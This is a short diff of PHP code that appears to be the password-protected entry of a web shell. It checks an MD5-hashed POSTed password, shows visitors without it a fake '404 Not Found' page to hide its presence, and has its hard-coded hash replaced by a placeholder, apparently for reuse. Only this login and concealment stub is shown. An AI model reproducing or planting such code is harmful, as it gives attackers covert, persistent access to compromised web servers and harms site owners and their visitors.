@@ -8,7 +8,7 @@
 @set_time_limit(0);
 @$pass = md5(trim($_POST['pass']));
 $chk_login = 1;
-$password =  "84659539fc6d9efe79cb090c5df28c8c";
+$password =  " pass md5 ";
 if($pass == $password){ $_SESSION['ses'] = "$pass";}if($chk_login){ if(!isset($_SESSION['ses']) or $_SESSION['ses'] != $password) { die(" <title>404 Not Found</title>
 </head><body>
 <h1>Not Found</h1>
